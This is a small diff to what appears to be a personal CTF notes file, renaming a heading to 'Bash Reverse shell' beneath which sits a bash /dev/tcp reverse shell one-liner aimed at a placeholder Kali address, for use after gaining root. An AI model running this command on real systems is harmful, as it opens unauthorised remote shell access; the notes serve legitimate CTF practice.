@@ -146,7 +146,7 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
 - `lscpu` will tell you if you are 32 or 64
 - `uname -m` similar but less verbose
 
-## Launch shells from a terminal
+## Bash Reverse shell
 
 - Say we have a way through root and we need to get a reverse shell here are helpfuls command
   - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
